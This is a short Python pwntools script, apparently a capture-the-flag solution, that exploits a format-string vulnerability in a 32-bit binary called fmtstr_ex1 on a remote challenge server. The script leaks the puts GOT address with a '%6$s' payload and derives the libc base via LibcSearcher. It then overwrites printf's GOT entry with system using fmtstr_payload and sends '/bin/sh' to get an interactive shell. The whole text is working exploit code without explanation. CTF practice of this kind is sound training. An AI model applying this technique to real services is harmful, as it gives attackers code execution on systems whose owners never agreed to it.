from pwn import *
from LibcSearcher3 import *

io = process('./fmtstr_ex1')
io = remote('ephemerally.top',28075)
elf = ELF('./fmtstr_ex1')
context.log_level = 'debug'
#raw_input()
pause()

# 泄漏libc
puts_got = elf.got['puts']

leak_libc = p32(puts_got) + b'%6$s' 

io.recvuntil(b'?\n')
io.sendline(leak_libc)
io.recvuntil(b'\x18\xa0\x04\x08')
puts_addr = u32(io.recv()[:4])
# print(hex(printf_addr))
libc = LibcSearcher('puts' , puts_addr)
libc_base = puts_addr - libc.dump('puts')
printf_addr = libc_base + libc.dump('printf')
system_addr = libc_base + libc.dump('system')

# 修改printf_got
printf_got = elf.got['printf']
payload = fmtstr_payload(6,{printf_got:system_addr})

io.sendline(payload)
io.sendline(b'/bin/sh')

io.interactive()
